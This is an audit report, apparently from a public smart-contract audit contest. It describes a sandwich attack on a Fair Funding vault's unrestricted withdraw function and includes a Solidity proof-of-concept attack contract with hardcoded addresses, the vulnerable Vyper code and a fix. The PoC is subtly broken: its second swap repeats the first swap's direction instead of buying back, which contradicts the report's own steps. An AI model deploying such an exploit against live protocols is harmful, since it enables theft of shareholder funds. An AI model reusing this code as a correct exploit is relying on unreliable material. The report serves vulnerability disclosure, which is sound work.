# [H] [H] Attacker may use sandwich attack to steal protocol funds

## Summary
Severity: High
Reporter: oxcm
Source: https://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L393-L404
Type: audit-issue

## Details
# [H] Attacker may use sandwich attack to steal protocol funds

## Summary

The `withdraw_underlying_to_claim()` method in the Fair Funding Alchemix Vault allows anyone to withdraw the extra shares to be distributed to token holders. The amount withdrawn is owned by all shareholders. The withdrawal function calls the withdrawUnderlying() function of Alchemist, which can be manipulated by an attacker to steal protocol investment returns through sandwich attacks by freely specifying `_min_weth_out`.

## Vulnerability Detail

The `_withdraw_underlying_from_alchemix()` function is called when `withdraw_underlying_to_claim()` is invoked, which calls the `withdrawUnderlying()` function of Alchemist. If the `TokenAdapter` uses an AMM similar to Uniswap for exchange, the attacker can implement a sandwich attack by setting `_min_weth_out` to 0. The attacker can manipulate the yield token and WETH's exchange rate, making yield token only be able to exchange for a small amount of WETH, and then restoring the price and stealing the exchange rate loss during the period.

### POC

Given:

* 1 yieldToken = 1 WETH
* claimable yieldToken = 10. 

Attacker can uses a self-made contract

1. manipulates the Uniswap Pool price, sells yieldToken and buys WETH, and lowers the price of yieldToken to 1 yieldToken = 0.1 WETH. 
2. call `withdraw_underlying_to_claim()` and set `_min_weth_out` to 0, forcing Fair Funding Alchemix Vault to sell 10 yieldToken at a price of 1 yieldToken = 0.1 WETH, and only recovering 1 WETH. 
3. buy back yieldToken and restores the price to profit from it.

code like:

```solidity
pragma solidity ^0.8.0;

import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

interface IAlchemistVault {
    function withdraw_underlying_to_claim(uint256 amount_shares, uint256 min_weth_out) external;
}

contract AlchemixAttack {
    IAlchemistVault public constant alchemix_vault = IAlchemistVault(address(0x73fddFb941c11d16E837Bd2dFA33A3B2A8752D1F));
    IUniswapV2Router02 public constant uniswap_router = IUniswapV2Router02(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

    address public constant weth_address = address(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2);
    address public constant yield_token_address = address(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    constructor() {}

    function attack() external {
        uint256 amount_shares = 10;
        uint256 min_weth_out = 0;
        uint256 amount_yield_token = 10e18; // 10 yield token to be used to manipulate the price

        // Manipulate yield token price
        uniswap_router.swapExactTokensForTokens(
            amount_yield_token, // amount in
            0, // amount out (min)
            getPathForTokenToToken(yield_token_address, weth_address),
            address(this),
            block.timestamp
        );

        // Withdraw all shares to the contract address, causing Alchemix to receive WETH
        alchemix_vault.withdraw_underlying_to_claim(amount_shares, min_weth_out);

        // Manipulate yield token price again
        uniswap_router.swapExactTokensForTokens(
            amount_yield_token, // amount in
            0, // amount out (min)
            getPathForTokenToToken(yield_token_address, weth_address),
            address(this),
            block.timestamp
        );

        // The attacker should now own a large amount of yield tokens and have profited from the sandwich attack
    }

    function getPathForTokenToToken(address _tokenA, address _tokenB) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = _tokenA;
        path[1] = _tokenB;
        return path;
    }
}
```

## Impact

An attacker can design a sandwich attack to steal protocol investment returns which belongs to shareholders.

## Code Snippet

https://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L393-L404

```vyper=393
@external
def withdraw_underlying_to_claim(_amount_shares: uint256, _min_weth_out: uint256):
    """
    @notice
        Withdraws _amount_shares and _min_weth_out from Alchemix to be distributed
        to token holders.
        The WETH is held in this contract until it is `claim`ed.
    """
    amount_withdrawn: uint256 = self._withdraw_underlying_from_alchemix(_amount_shares, self, _min_weth_out)
    self._mark_as_claimable(amount_withdrawn)

    log Claimable(amount_withdrawn)
```

## Tool used

Manual Review / ChatGPT PLUS


## Recommendation

It is recommended to modify the `withdraw_underlying_to_claim() `method to only allow specific roles, such as the keeper, to call it. The parameter for controlling the sliding ratio should be determined by off-chain calculation.
